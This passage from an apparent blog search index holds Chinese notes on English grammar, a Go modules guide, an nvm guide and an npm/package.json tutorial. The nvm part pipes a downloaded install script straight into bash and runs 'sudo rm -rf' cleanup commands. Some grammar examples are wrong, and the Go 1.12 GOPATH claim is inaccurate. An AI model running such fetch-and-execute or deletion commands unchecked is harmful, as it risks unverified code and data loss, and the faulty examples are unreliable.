pretty tall.(修饰形容词)\n\n时间副词\n+ He came yesterday.\n+ Yesterday He came.\n\n时间状语从句\n+ He called me when I was sleeping.\n\n地点副词:\n+ He celebrated his birthday at school.\n+ At school he celebrated his brithday.\n\n地点状语从句\n+ We met where we used to go for a walk.\n\n原因状语从句:\n+ He likes spring for it is beautiful.\n+ He likes spring since it is beautiful.(除了 since, 其他引导词都不能在前面)\n\n条件状语从句:\n+ If you win, there will be a reward.\n+ As long as you win, there will be a reward.\n\n目的状语\n+ I study for my well-being.\n+ I don't spend extra to save money.\n+ I don't spend extra so that I can save money.(从句)\n\n方式状语\n+ I learned English through an online course.\n+ I contact my friends via wechat.\n\n结果状语从句\n+ He tried so hard that he finally successed.\n\n让步状语从句(后面不要转接词)\n+ Although you have a point there, i don't agree with your proposal.\n\n\n\n\n\n# 四. 三个特殊句式\n\n### 4.1 强调句\n\n+ He hit me.\n\n  It was him that hit me.\n\n+ I learn about this project through this site.\n\n  It was through this site that I learned about this project.\n\n强调的内容在 it is 的后面\n\nIt is 名词 that 动词(名词)  \n\nIt is 介宾 that 主谓(宾)\n\n\n\n### 4.2 倒装句\n\n正常句: 主谓(宾)\n\n倒装句: 谓主(宾) \n\n+ We can win only when we try harder.\n\n  Only when we try harder can we win.\n\n+ We can win only through hard work.\n\n  Only through hard work can we win.\n\n\n\n### 4.3 虚拟语气\n\n假设一件有可能发生的事情 -> 条件状语从句\n\n假设一件不可能发生的事情(我是个女的?) -> 虚拟语气\n\n+ 条件状语从句(主将从现)\n\nIf it rains, the event will be canceled.\n\n+ 虚拟语气\n\n  + 现在不可能(一般过去时)\n\n    If i were a girl, i would be a soldier.\n\n  + 过去不可能(过去完成时)\n\n    I had studied English, it would have been easier now.\n\n\n\n\n\n\n\n# 五. 时态\n\n\n\n一般(习惯性) \n\n+ 现在\n+ 过去\n+ 将来\n\n进行(正在发生)\n\n+ 现在\n+ 过去\n+ 未来\n\n完成(有结果,造成了影响)\n\n+ 现在(对现在有影响)\n+ 过去(对昨天有影响)\n+ 将来(对明天有影响)\n\n\n\n# 六. 语态\n\n### 5.1 主动语态\n\nI finished my task.\n\n### 5.2 被动语态(Be 动词+ 动词过去分词)\n\nMy task is finished.\n\n\n\n# 七. 非谓语\n\n不是谓语, 但是和动作有关系(动词分词), 像是引导词\n\n分词\n\n+ 现在分词(doing) 主动关系做了\n\n+ 过去分词(done) 被动关系做了\n\n  \n\n+ The boy was lost, failing to find the way back here.\n+ The boy was lost, failed by his poor memory.\n\n\n\n\n\n# 八. 英语句子成分\n\n+ 一个句子最最基本的成分是主语和谓语,二者缺一不可,否则就不是完整的句子.\n+ 主语可以简单的理解成名词, 谓语可以简单理解为动词\n+ 宾语一般也是名词, 句子承受者\n+ 定语简单理解为形容词\n+ 表语, 常见系表结构, 通常也是形容词\n+ 状语简单理解为副词, 说明地点、时间、原因、目的、结果、条件、方向、程度、方式和伴随状况等。 \n\n","tags":["english"],"categories":["英语"]},{"title":"go-module的使用","url":"%2Fp%2F6c6632b7.html","content":"\n\n\ngolang从诞生之初就一直有个被诟病的问题：缺少一个行之有效的“官方”包依赖管理工具。之前golang包管理工具有数十个， 说实话都不是让人非常满意。\n\ngo 1.11 有了对模块的实验性支持，大部分的子命令都知道如何处理一个模块，比如 run build install get list mod 子命令。go 1.12 会删除对 GOPATH 的支持，go get 命令也会变成只能获取模块，不能像现在这样直接获取一个裸包。\n\n\n\n\n\n可以用环境变量 GO111MODULE 开启或关闭模块支持，它有三个可选值：off、on、auto，默认值是 auto。\n\n- GO111MODULE=off 无模块支持，go 会从 GOPATH 和 vendor 文件夹寻找包。\n- GO111MODULE=on 模块支持，go 会忽略 GOPATH 和 vendor 文件夹，只根据 go.mod 下载依赖。\n- GO111MODULE=auto 在 $GOPATH/src 外面且根目录有 go.mod 文件时，开启模块支持。\n\n在使用模块的时候，GOPATH 是无意义的，不过它还是会把下载的依赖储存在 $GOPATH/pkg/mod 中，也会把 go install 的结果放在 $GOPATH/bin 中。\n\n<!-- more -->\n\n### 1. go mod 使用教程\n\nhttps://github.com/golang/go/wiki/Modules # 官方wiki, 基本所有的问题都能在这里找到\n\n\n\n##### 1.1 在使用前先确保golang升级到1.11:\n\nhttps://golang.org/dl/ #下载golang\n\n\n\n### 2. 使用go mod 实践\n\n\n\n##### 2.1. 快速开始：\n\n1. 把之前的工程拷贝到$GOPATH/src之外\n\n2. 在工程目录下执行：go mod init {module name}，该命令会创建一个go.mod文件\n\n3. 然后在该目录下执行 go build，就可以了，go.mod中记录了依赖包及其版本号。\n\n   \n\n##### 2.2. 在 go build 中 遇到了以下几个问题, 记录如下:\n\n\n\n2.2.1 golang.org的包竟然下不下来(你懂的)\n\n可以使用在go.mod里添加replace选项\n\n```go\nreplace (golang.org/x/text => github.com/golang/text v0.3.0 )\n```\n\n 也可以用代理的方式, 更加方便\n\n```shell\nexport GOPROXY=https://athens.azurefd.net\n```\n\n\n\n2.2.2 发现找不到包(包层级多的)\n\ncannot load github.com/aliyun/alibaba-cloud-sdk-go/sdk: cannot find module providing package github.com/aliyun/alibaba-cloud-sdk-go/sdk\n\n```shell\ngo get github.com/aliyun/alibaba-cloud-sdk-go@master  #带@master\n```\n\n\n\n2.2.3 在替换的时候还发现这个错误\n\ncannot call non-function xurls.Strict (type *regexp.Regexp)\n\n```shell\nmvdan.cc/xurls  #之前用的是这个版本,换成下面的就可以了\nmvdan.cc/xurls/v2\n```\n\n\n\n2.2.4  只有直接使用的依赖会被记录在`go.mod`文件中, 贴出go.mod的内容如下:\n\n```go\nmodule github.com/unix2dos/goods-notify\n\n\n\ngo 1.12\n\n\n\nrequire (\n\n\tgithub.com/PuerkitoBio/goquery v1.5.0\n\n\tgithub.com/aliyun/alibaba-cloud-sdk-go v0.0.0-20190528035818-94084c920892\n\n\tgithub.com/gorilla/websocket v1.4.0 // indirect\n\n\tgithub.com/joho/godotenv v1.3.0\n\n\tgithub.com/pkg/errors v0.8.1 // indirect\n\n\tgithub.com/stretchr/testify v1.3.0\n\n\tgithub.com/unix2dos/bearychat-go v0.0.0-20190222142113-d09d4a5e73e5\n\n\tgithub.com/valyala/fasthttp v1.3.0\n\n\tgithub.com/yunpian/yunpian-go-sdk v0.0.0-20171206021512-2193bf8a7459\n\n\tgolang.org/x/text v0.3.2\n\n\tmvdan.cc/xurls/v2 v2.0.0\n\n)\n```\n\n\n\n`indirect` 注释标记了依赖不是被当前模块直接使用的，只是在其他依赖项中被间接引用。\n\n\n\n2.2.5  go.sum文件介绍\n\n同时，`go.mod`和`go`命令维护了一个名叫`go.sum`的文件包含了指定模块版本的期望的[加密hash](https://golang.org/cmd/go/#hdr-Module_downloading_and_verification)：\n\n`go`命令使用`go.sum`文件保证之后的模块下载会下载到跟第一次下载相同的文件内容，保证你的项目依赖不会发生预期外的恶意修改、意外问题和其他问题。`go.mod` 和 `go.sum`都需要放进版本管理中。\n\n\n\n### 3. go mod 相关操作\n\n`go list -m all`  可以查看当前的依赖和版本(当前模块，或者叫做主模块，通常是第一行，接下来是根据依赖路径排序的依赖)。\n\n\n\n`go mod edit -fmt` 格式化 `go.mod` 文件。\n\n\n\n `go mod tidy` 从 `go.mod` 删除不需要的依赖、新增需要的依赖，这个操作不会改变依赖版本。\n\n\n\n##### 3.1 go get 命令\n\n获取依赖的特定版本，用来升级和降级依赖。可以自动修改 `go.mod` 文件，而且依赖的依赖版本号也可能会变。在 `go.mod` 中使用 `exclude` 排除的包，不能 `go get` 下来。\n\n\n\n与以前不同的是，新版 `go get` 可以在末尾加 `@` 符号，用来指定版本。\n\n它要求仓库必须用 `v1.2.0` 格式打 tag，像 `v1.2` 少个零都不行的，必须是[语义化](https://semver.org/lang/zh-CN/)的、带 `v` 前缀的版本号。\n\n\n\n```\ngo get github.com/gorilla/mux           # 匹配最新的一个 tag\ngo get github.com/gorilla/mux@latest    # 和上面一样\ngo get github.com/gorilla/mux@v1.6.2    # 匹配 v1.6.2\ngo get github.com/gorilla/mux@e3702bed2 # 匹配 v1.6.2\ngo get github.com/gorilla/mux@c856192   # 匹配 c85619274f5d\ngo get github.com/gorilla/mux@master    # 匹配 master 分支\n```\n\n\n\n`latest` 匹配最新的 tag。\n\n`v1.2.6` 完整版本的写法。\n\n`v1`、`v1.2` 匹配带这个前缀的最新版本，如果最新版是 `1.2.7`，它们会匹配 `1.2.7`。\n\n`c856192` 版本 hash 前缀、分支名、无语义化的标签，在 `go.mod` 里都会会使用约定写法 `v0.0.0-20180517173623-c85619274f5d`，也被称作伪版本。\n\n`go get` 可以模糊匹配版本号，但 `go.mod` 文件只体现完整的版本号，即 `v1.2.0`、`v0.0.0-20180517173623-c85619274f5d`，只不过不需要手写这么长的版本号，用 `go get` 或上文的 `go mod edit -require` 模糊匹配即可，它会把匹配到的完整版本号写进 `go.mod`  文件。\n\n\n\n\n\n参考资料:\n\nhttps://github.com/golang/go/wiki/Modules\n\nhttps://www.jianshu.com/p/c5733da150c6\n\nhttps://www.4async.com/2019/03/using-go-modules/","tags":["golang"],"categories":["golang"]},{"title":"刘晓艳笔记_2并列句","url":"%2Fp%2F10fee324.html","content":"\n# 1. 并列句\n\n### 1.1 什么是并列句?\n\n就是用!!!连词!!!!连接两个句子\n\n<!-- more -->\n\n### 1.2 常见的逻辑词(包含连词, 副词, 介词短语)\n\n##### 1.2.1 平行关系连词\n\n+ and\n\n+ not only, but also\n\n副词和介词短语\n\n+ similarly\n+ equally\n+ likewise\n+ at the same time\n+ in the meanwhile\n\n##### 1.2.2 转折关系连词\n\n+ but\n+ yet\n+ while\n+ whereas\n\n副词和介词短语\n\n+ however\n+ nervertheless\n+ conversely\n+ unexpectedly\n+ unfortunately\n+ on the contrary\n+ by contrast\n\n##### 1.2.3 选择关系连词\n\n+ or\n\n副词和介词短语\n\n+ alternatively\n\n##### 1.2.4 因果关系连词\n\n+ for\n+ so\n\n副词和介词短语\n\n+ therefore\n+ thus\n+ consequently\n+ as a result\n\n##### 1.2.5 递进关系连词\n\n+ then\n\n副词和介词短语\n\n+ besides\n+ furthermore\n+ moreover\n+ additionally\n+ subsequently\n\n\n\n# 2. 逻辑\n\n### 2.1 逻辑关系\n\n写作的上下文有逻辑关系, 就一定要用逻辑关系词(连词, 副词, 介词和介词短语)\n\n+ 没有逻辑词语就没有逻辑关系\n\n### 2.2 连词前面逗号\n\n可以有, 可以没有\n\n### 2.3 介词短语, 副词前面不能有逗号\n\n+ 把逗号变成句号.\n\n+ 或者再加个连词(and 是没有意思的连词)\n\n### 2.4 连词和其他逻辑词区别\n\n+ 连词前面有无逗号都可以\n+ 其他逻辑关系词前面, 要么加句号, 要么加连词 and\n\n\n\n# 3. 考点\n\n+ 只需要读懂, 逻辑关系词前后两句话的意思就 ok, 看什么关系\n+ 阅读理解, 读每段的首句和尾句, 知道文章的中心. 看选项和中心意思相近的.\n\n\n\n# 4. 长难句分析\n\n+ 在分析长难句时, 有并列连词的出现, 通常都会有省略\n\n+ 第一步, 找谓词\n\n+ 第二步, 找连词, 但是连词在连接两个单词的时候, 这个连词就装作没看见, 就是普通的 and\n\n+ 第三步, 连词有可能会省略后面内容, 就看连词前多什么内容\n\n  \n\n### 4.1 如何查找省略的内容呢?(连词前少不算少,只有后会少)\n\n+ 一句话只要有省略, 一定省略连词的后面, 连词前不可能省略.    对\n\n+ 所以连词后面有的成分, 连词前面通常都要有.  \n\n  解释: 连词后只有一个成分,连词前一定能对应, 连词后有多个成分, 连词前不一定都能找到对应成分,但是至少有一个\n\n+ 连词前面有, 连词后面没有的成分, 便是省略的内容.\n\n\n\n### 4.2 代词补充\n\n+ 代词指代替的做题方法, 就近原则(跟谁近)和一致原则(意思)\n\n\n\n\n\n\n\n\n\n\n\n","tags":["english"],"categories":["英语"]},{"title":"刘晓艳笔记_1句子的成分","url":"%2Fp%2F891631f4.html","content":"\n# 1. 英语句子\n\n+ 必须有主谓\n+ 主语一定是谓语的发出者\n+ 如有宾语, 宾语一定是谓语的承受者\n<!-- more -->\n# 2. 英语句子的基本结构\n\n### 2.1 主谓\n\n### 2.2 主谓宾\n\n谓语: 实义动词(及物动词和不及物动词)\n\n+ 及物动词后面必须加宾语\n\n### 2.3 主系表\n\n谓语: 系动词\n\n+ be\n+ 感官动词 (look,smell,taste,sound,feel)\n+ 变化 (become, get, turn, grow, fall)\n+ 保持(keep, remain, stay, stand)\n\n### 2.4 主谓宾宾\n\n+ I bought him a dog. 我买他一个狗\n\n+ 两个宾语没有关系, (他是一个狗, 肯定不对)\n\n### 2.5 主谓宾宾补\n\n+ We made him our monitor.  我们让他当班长\n+ You should keep the room clean. 你应该让房间干净\n\n### 2.6 总结:\n\n+ 2.4和2.5区别, 在宾语后面(假如)加个是,如果是对的,就是2.5\n\n\n\n# 3. 谓语\n\n### 3.1 谓语的成分\n\n+ 有时态的实义动词(情态动词不能做)\n\n+ 系动词\n\nhave limited.  整个是谓语, have 是构成时态的.\n\n### 3.2 动词能不能多?\n\n+ 谓语只能是动词?      对\n+ 动词只能做谓语?      对(非谓语动词不是动词)\n+ 绝对不能多, 其他的动词变成非谓语动词\n+ 只有一个动词, 谁的意义最重要, 选谁做动词\n  + 我爱你, 你爱我 (I loving you, you love me)\n\n### 3.3 动词能不能少?\n\n+ 绝对不能, 少的话加 be 动词\n+ I against you.   (against 是介词)   --->  I am against you.\n+ 当一句话需要动词又没有动词的时候,需要加 be 动词, be动词没有意思.\n\n### 3.4 动词变非(谓语动词)\n\n  + ing 主动\n  + ed   被动\n  + to do  目的\n\n### 3.5 总结\n\n  + 看句子第一步, 找动词\n  + 一句话当中,有且只能有一个有时态的实意动词或系动词的存在,并且充当谓语.\n\n### 3.6 多个句子变成一句话(3个方法)\n\n+ 独立主格(一个谓词, 其他非谓语动词)\n  + 两个主语要不一样\n  + 如果一样的话, 要省略掉非谓语动词的主语(不是独立主格, 叫分词做状语)\n  + Being a teacher, I like singing songs. 我是一个老师,我喜欢唱歌.\n+ 加连接词(and...)组成并列句\n+ 主句+从句组成复合句\n\n\n\n# 4. 主语\n\n### 4.1 主语的成分\n\n+ 名词\n\n+ 代词\n\n+ 非谓语动词\n\n+ 句子不能,从句可以(引导词+句子)\n\n  \n\nHandsome and strong are his nature. (错误,形容词不可以当主语)\n\n改成\n\nBeing handsome and strong is his nature. (非谓语动词做主语)\n\n### 4.2 主句能不能少\n\n+ 绝对不能\n+ 祈使句有主语,只是省略了\n\n没有主语怎么办?\n\n+ 加 it 作为主语,  必须与天气, 温度,时间有关系.\n\n  + It feels exceedingly hot in the cabin.(机舱里很热)\n\n+ there be 句型, 听到 \"有\" 的时候使用.\n\n  + There exist a host of undergraduates being fascinated with me.(一些大学生喜欢我)\n\n+ 被动: 如果一句话没有主语, 所有用人称代词做主语的句子,都可以考虑写成被动.\n\n  + Persistence must be pointed out outstandingly.(必须指出坚持很重要.)\n\n  + 三种情况无被动.   \n\n    + 动词后面有介词时, 无被动\n\n    + 系动词没有被动\n    + have 表达 \"有\" 的意思时, 无被动\n\n+ 人称代词做主语.  (I you we)\n  + 不到万不得已,不要使用\n\n\n\n# 5. 宾语\n\n### 5.1 宾语的成分\n\n+ 名词(代词)\n+ 非谓语动词\n+ 从句\n\n和主语成分一样, 因为可以和主语换主动被动.\n\n# 6. 表语\n\n### 6.1 表语的成分\n\n+ 名词(代词)\n+ 非谓语动词\n+ 从句\n+ (特有)形容词\n+ (特有)介词短语\n\n\n\n# 7. 练习\n\n+ 我喜欢在重庆,  I like being in Beijing.  (介词短语不能做宾语,换成非谓语动词)\n+ I smile on the stage. (主谓结构, 介词不能做宾语,不是主谓宾, smile实义动词,不是主系表)\n\n+ I exchange with my watch.(写错了的句子, exchange及物动词后面必须跟宾语,少了成分)\n\n\n\n# 8. 简单句考点分析\n\n### 8.1 写作\n\n+ 先写成简单句,保证语法正确\n+ 单词不会写, 换成自己会的单词,老师也不知道我表达的意思\n\n### 8.2 长短句分析\n\n+ 第一步, 找动词(谓语), 从而找到一句话的主谓宾\n+ 如果有多个动词, 可能是并列句或者复合句从句, 只能1个是主语的动词\n+ 主语的谓语动词前面没有引导词\n\n### 8.3 习题\n\n+ 全球在变暖\n\n  It is becoming warm throughout the world.\n\n+ 妒忌本身就是一种仰望.\n\n  Being jealous is a kind of worship.\n\n+ 有意义就是好好活\n\n  Being meaningful proves to live well.\n\n+ 好好活就是做有意义的事情\n\n  living well seems to do meaningful things.","tags":["enlish"],"categories":["英语"]},{"title":"node版本管理nvm的安装和使用","url":"%2Fp%2Fdf22a20c.html","content":"\n\n\n我们可能同时在进行2个项目，而2个不同的项目所使用的node版本又是不一样的，或者是要用更新的node版本进行试验和学习。这种情况下，对于维护多个版本的node将会是一件非常麻烦的事情，而nvm就是为解决这个问题而产生的，他可以方便的在同一台设备上进行多个node版本之间切换，而这个正是nvm的价值所在。\n\n\n\n### 1. nodejs，npm，nvm之间的区别\n\n+ nodejs：在项目开发时的所需要的代码库\n\n+ npm：nodejs 包管理工具。在安装的 nodejs 的时候，npm 也会跟着一起安装，它是包管理工具。npm 管理 nodejs 中的第三方插件\n\n+ nvm：nodejs 版本管理工具。也就是说：一个 nvm 可以管理很多 node 版本和 npm 版本。\n\n\n\n<!-- more -->\n\n### 2. nvm的安装:\n\n如果在安装nvm之前就安装了node, 那么最好在安装之前清理下全局的node环境.\n\n```shell\nnpm ls -g --depth=0 # 查看已经安装在全局的模块，以便删除这些全局模块后再按照不同的 node 版本重新进行全局安装\n\nsudo rm -rf /usr/local/lib/node_modules # 删除全局 node_modules 目录\n\nsudo rm -rf ~/.npm/ # 删除模块缓存目录\n\nsudo rm /usr/local/bin/node # 删除 node\n\ncd  /usr/local/bin && ls -l | grep \"../lib/node_modules/\" | awk '{print $9}'| xargs rm # 删除全局 node 模块注册的软链\n```\n\n\n\n安装: https://github.com/nvm-sh/nvm\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash(zsh)# 注意后面的bash环境\n```\n\n重新打开一个终端输入 `nvm`即可\n\n\n\n### 3. nvm常用指令\n\n```shell\nnvm version #查看当前的版本\n\nnvm ls-remote #列出所有可安装的版本\n\nnvm install <version> #安装指定的版本，如nvm install v8.14.0\n\nnvm uninstall <version> #卸载指定的版本\n\nnvm ls #列出所有已经安装的版本\n\nnvm use <version> #切换使用指定的版本\n\nnvm current #显示当前使用的版本\n\nnvm alias default <version> #设置默认node版本\n\n```\n\n\n\n#### 3.1 安装最新稳定版 node\n\n```shell\nnvm install stable  \n```\n\n\n\n#### 3.2 node被安装在哪里了呢?\n\n在终端我们可以使用which node来查看我们的node被安装到了哪里，这里终端打印出来的地址其实是你当前使用的node版本快捷方式的地址。\n\n```\n$ which node\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/node\n\n\n$ which npm\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/npm\n```\n\n\n\n### 4. nvm 和 n  的区别\n\n在 node 的版本管理工具中，nvm 自然声名远扬，然而我们也不能忘了来自 TJ 的 n。这两种，是目前最主流的方案。\n\n关于这两个工具如何安装和使用，这里不再赘言，请见它们各自的主页：\n\n- [creationix/nvm](https://github.com/creationix/nvm)\n- [tj/n](https://github.com/tj/n)\n\n接下来我们着重关注一下 nvm 和 n 的运作机制和特性。\n\n#### 4.1 n\n\nn 是一个需要全局安装的 npm package。\n\n```shell\nnpm install -g n\n```\n\n\n这意味着，我们在使用 n 管理 node 版本前，首先需要一个 node 环境。我们或者用 Homebrew 来安装一个 node，或者从官网下载 pkg 来安装，总之我们得先自己装一个 node —— n 本身是没法给你装的。\n\n然后我们可以使用 n 来安装不同版本的 node。\n\n在安装的时候，n 会先将指定版本的 node 存储下来，然后将其复制到我们熟知的路径/usr/local/bin，非常简单明了。当然由于 n 会操作到非用户目录，所以需要加 sudo 来执行命令。\n\n所以这样看来，n 在其实现上是一个非常易理解的方案。\n\n\n\n#### 4.2 nvm\n\n我们再来看 nvm。不同于 n，nvm 不是一个 npm package，而是一个独立软件包。这意味着我们需要单独使用它的安装逻辑：\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash(zsh)# 注意后面的bash环境\n```\n\n\n\n然后我们可以使用 nvm 来安装不同版本的 node。\n\n在安装的时候，nvm 将不同的 node 版本存储到 ~/.nvm/<version>/ 下，然后修改$PATH，将指定版本的 node 路径加入，这样我们调用的 node 命令即是使用指定版本的 node。\n\nnvm 显然比 n 要复杂一些，但是另一方面，由于它是一个独立软件包，因此它和 node 之间的关系看上去更合乎逻辑：nvm 不依赖 node 环境，是 node 依赖 nvm；而不像 n 那样产生类似循环依赖的问题。\n\n","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejs的模块安装和package.json","url":"%2Fp%2Fd100a0c2.html","content":"\n\n\n### 1. npm 介绍\n\n[npm](https://www.npmjs.com/package/npm) 是 Node 的模块管理器，功能极其强大。它是 Node 获得成功的重要原因之一。\n\nnpm不需要单独安装。在安装Node的时候，会连带一起安装npm。但是，Node附带的npm可能不是最新版本，最好用下面的命令，更新到最新版本。\n\n```shell\nnpm install npm@latest -g \n```\n\n上面的命令中，@latest表示最新版本，-g表示全局安装。所以，命令的主干是npm install npm，也就是使用npm安装自己。之所以可以这样，是因为npm本身与Node的其他模块没有区别。\n\n<!-- more -->\n\n\n\n### 2. npm 安装\n\n#### 2.1 npm install \n\n[npm install](https://docs.npmjs.com/cli/install) 命令用来安装模块到node_modules目录。\n\n```shell\n $ npm install <packageName> \n```\n\n\n\n安装之前，npm install会先检查，node_modules目录之中是否已经存在指定模块。如果存在，就不再重新安装了，即使远程仓库已经有了一个新版本，也是如此。\n\n如果你希望，一个模块不管是否安装过，npm 都要强制重新安装，可以使用-f或--force参数。\n\n```shell\n $ npm install <packageName> --force\n```\n\n\n\n#### 2.2 npm update\n\n如果想更新已安装模块，就要用到[npm update](https://docs.npmjs.com/cli/update)命令。\n\n```shell\n $ npm update <packageName> \n```\n\n它会先到远程仓库查询最新版本，然后查询本地版本。如果本地版本不存在，或者远程版本较新，就会安装。\n\n\n\n#### 2.3 registry\n\nnpm update命令怎么知道每个模块的最新版本呢？\n\n答案是 npm 模块仓库提供了一个查询服务，叫做 registry 。以 npmjs.org 为例，它的查询服务网址是 https://registry.npmjs.org/ 。\n\n这个网址后面跟上模块名，就会得到一个 JSON 对象，里面是该模块所有版本的信息。比如，访问 <https://registry.npmjs.org/react>，就会看到 react 模块所有版本的信息。\n\n它跟下面命令的效果是一样的。\n\n```shell\n $ npm view react  \n```\n\n\n\nregistry 网址的模块名后面，还可以跟上版本号或者标签，用来查询某个具体版本的信息。比如， 访问 https://registry.npmjs.org/react/v0.14.6 ，就可以看到 React 的 0.14.6 版。\n\n返回的 JSON 对象里面，有一个dist.tarball属性，是该版本压缩包的网址。\n\n```json\ndist: {   \n\tshasum: '2a57c2cf8747b483759ad8de0fa47fb0c5cf5c6a',   \n\ttarball: 'http://registry.npmjs.org/react/-/react-0.14.6.tgz'  \n},\n```\n\n\n\n到这个网址下载压缩包，在本地解压，就得到了模块的源码。`npm install`和`npm update`命令，都是通过这种方式安装模块的。\n\n\n\n#### 2.4 缓存目录\n\nnpm install或npm update命令，从 registry 下载压缩包之后，都存放在本地的缓存目录。\n\n这个缓存目录，在 Linux 或 Mac 默认是用户主目录下的.npm目录，在 Windows 默认是%AppData%/npm-cache。通过配置命令，可以查看这个目录的具体位置。\n\n```shell\n $ npm config get cache \n /Users/liuwei/.npm\n```\n\n \n\n.npm目录保存着大量文件，清空它的命令如下。 \n\n```shell\n$ rm -rf ~/.npm/ \n或\n$ npm cache clean \n```\n\n\n\n#### 2.5 模块的安装过程\n\n总结一下，Node模块的安装过程是这样的。\n\n1. 发出npm install命令\n2. npm 向 registry 查询模块压缩包的网址\n3. 下载压缩包，存放在~/.npm目录\n4. 解压压缩包到当前项目的node_modules目录\n\n\n\n注意，一个模块安装以后，本地其实保存了两份。一份是~/.npm目录下的压缩包，另一份是node_modules目录下解压后的代码。\n\n但是，运行npm install的时候，只会检查node_modules目录，而不会检查~/.npm目录。也就是说，如果一个模块在～/.npm下有压缩包，但是没有安装在node_modules目录中，npm 依然会从远程仓库下载一次新的压缩包。\n\n\n\n### 3. package.json\n\n管理本地安装 npm 包的最好方式就是创建 package.json 文件。一个 package.json 文件可以有以下几点作用：\n\n+ 作为一个描述文件，描述了你的项目依赖哪些包\n\n+ 允许我们使用 “语义化版本规则”（后面介绍）指明你项目依赖包的版本\n\n+ 让你的构建更好地与其他开发者分享，便于重复使用\n\n  \n\n使用 `npm init` 即可在当前目录创建一个 `package.json` 文件。如果嫌回答这一大堆问题麻烦，可以直接输入` npm init -—yes` 跳过回答问题步骤，直接生成默认值的 package.json 文件：\n\n```json\n{\n  \"name\": \"package\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n```\n\n\n\n#### 3.1 package.json 的内容\n\n\n\n##### 3.1.1 `package.json` 文件至少要有两部分内容：\n\n1. “name”\n   - 全部小写，没有空格，可以使用下划线或者横线\n2. “version” \n   - x.x.x 的格式\n   - 符合“语义化版本规则”\n\n\n\n##### 3.1.2 其他内容：\n\n+ description：描述信息，有助于搜索\n+ main: `入口文件`，一般都是 index.js. 当使用require()语法来加载一个模块时，就会看此值\n+ scripts：支持的脚本，默认是一个空的 test\n+ keywords：关键字，有助于在人们使用 npm search 搜索时发现你的项目\n+ author：作者信息\n+ license：默认是 MIT\n+ bugs：当前项目的一些错误信息，如果有的话\n\n\n\n##### 3.1.3 scripts属性\n\n可以指定npm命令缩写。\n\n```\n  \"scripts\": {\n    \"start\": \"node store.js\"\n  },\n```\n\n\n\n执行npm run start仍然可以运行成功，通过scripts属性npm run start等价于node store.js。关于scripts的更具体的使用[请看这里](http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html)。\n\n\n\n#### 3.2 指定依赖的包\n\n我们需要在 `package.json` 文件中指定项目依赖的包，这样别人在拿到这个项目时才可以使用 `npm install` 下载。\n\n包有两种依赖方式：\n\n1. `dependencies`：在生产环境中需要用到的依赖\n2. `devDependencies`：在开发、测试环境中用到的依赖\n\n\n\n举个例子：\n\n```\n{\n    \"name\": \"my-weex-demo\",\n    \"version\": \"1.0.0\",\n    \"description\": \"a weex project\",\n    \"main\": \"index.js\",\n    \"devDependencies\": {\n        \"babel-core\": \"^6.14.0\",\n        \"babel-loader\": \"^6.2.5\",\n        \"babel-preset-es2015\": \"^6.18.0\",\n        \"vue-loader\": \"^10.0.2\",\n        \"eslint\": \"^3.5.0\",\n        \"serve\": \"^1.4.0\",\n        \"webpack\": \"^1.13.2\",\n        \"weex-loader\": \"^0.3.3\",\n        \"weex-builder\": \"^0.2.6\"\n    },\n    \"dependencies\": {\n        \"weex-html5\": \"^0.3.2\",\n        \"weex-components\": \"*\"\n    }\n}\n```\n\n\n\n#### 3.3 semantic versioning（语义化版本规则）\n\n\n\ndependencies 的内容，以 \"weex-html5\": \"^0.3.2\" 为例，我们知道 key 是依赖的包名称，value 是这个包的版本。那版本前面的 ^ 或者版本直接是一个 * 是什么意思呢？这就是 npm 的 “Semantic versioning”，简称”Semver”，中文含义即“语义化版本规则”。\n\n在开发中我们有过这样的经验：有时候依赖的包升级后大改版，之前提供的接口不见了，这对使用者的项目可能造成极大的影响。因此我们在声明对某个包的依赖时需要指明是否允许 update 到新版本，什么情况下允许更新。这就需要先了解 npm 包提供者应该注意的版本号规范。\n\n\n\n如果一个项目打算与别人分享，应该从 1.0.0 版本开始。以后要升级版本应该遵循以下标准：\n\n```\n补丁版本：解决了 Bug 或者一些较小的更改，增加最后一位数字，比如 1.0.1\n小版本：增加了新特性，同时不会影响之前的版本，增加中间一位数字，比如 1.1.0\n大版本：大改版，无法兼容之前的，增加第一位数字，比如 2.0.0\n\n了解了提供者的版本规范后， npm 包使用者就可以针对自己的需要填写依赖包的版本规则。\n```\n\n\n\n作为使用者，我们可以在 package.json 文件中写明我们可以接受这个包的更新程度（假设当前依赖的是 1.0.4 版本）：\n\n如果只打算接受补丁版本的更新（也就是最后一位的改变），就可以这么写： \n\n```\n1.0\n1.0.x\n~1.0.4\n```\n\n如果接受小版本的更新（第二位的改变），就可以这么写： \n\n```\n1\n1.x\n^1.0.4\n```\n\n如果可以接受大版本的更新（自然接受小版本和补丁版本的改变），就可以这么写： \n\n```\n*\nx\n```\n\n\n小结一下：总共三种版本变化类型，接受依赖包哪种类型的更新，就把版本号准确写到前一位。\n\n\n\n\n\n### 4. 其他安装知识\n\n\n\n#### 4.1 安装参数 --save 和 --save -dev\n\n添加依赖时我们可以手动修改 package.json 文件，添加或者修改 dependencies devDependencies 中的内容即可。另一种更酷的方式是用命令行，在使用 npm install 时增加 --save 或者 --save -dev 后缀：\n\n```\nnpm install <package_name> --save 表示将这个包名及对应的版本添加到 package.json的 dependencies\n\nnpm install <package_name> --save-dev 表示将这个包名及对应的版本添加到 package.json的 devDependencies\n```\n\ndependencies：在生产环境中需要用到的依赖\n\ndevDependencies：在开发、测试环境中用到的依赖\n\n\n\n#### 4.2 全局安装 package\n\n如果你想要直接在命令行中使用某个包，比如 jshint ，你可以全局安装它。全局安装比本地安装多了个 -g:\n\n```\nnpm install -g <package-name>\n```\n\n安装后可以使用 npm ls -g --depth=0 查看安装在全局第一层的包。\n\n##### 4.2.1 全局安装的权限问题\n\n在全局安装时可能会遇到 EACCES 权限问题, 可以如下解决：\n\n1.使用 sudo 简单粗暴，但是治标不治本\n\n2.修改 npm 全局默认目录的权限\n\n先获取 npm 